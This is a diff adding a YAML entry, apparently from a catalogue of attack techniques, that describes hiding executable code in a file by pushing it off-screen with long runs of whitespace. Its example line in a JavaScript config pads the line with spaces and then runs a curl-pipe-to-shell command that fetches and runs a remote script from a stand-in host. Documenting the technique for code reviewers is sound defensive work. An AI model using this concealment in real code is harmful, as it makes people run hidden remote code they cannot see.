@@ -1,0 +1,27 @@
+name: Long Whitespaces to hide Code
+id: long-whitespace-code
+description: >
+  Attackers can hide executable code by pushing it far to the right of a line using very long
+  runs of spaces or tabs. In many editors, code review UIs, and diffs, the visible area shows only
+  the beginning of the line, so malicious logic remains off-screen unless reviewers horizontally
+  scroll or inspect whitespace explicitly.
+author: LOC Team
+tags:
+  - code-review
+  - whitespace
+  - stealth
+  - code-execution
+
+exploitation: |
+  This technique does not require special Unicode tricks. It uses ordinary whitespace to move
+  meaningful code beyond the viewport.
+
+  Example in a JavaScript config file:
+
+  ```js
+  module.exports = { plugins: [] };                                                                                              require('node:child_process').execSync('curl -fsSL https://example.com/p | sh', { stdio: 'ignore' });
+  ```
+
+references:
+  - url: https://www.aikido.dev/blog/malware-hiding-in-plain-sight-spying-on-north-korean-hackers
+    description: "Malware hiding in plain sight: Spying on North Korean Hackers"
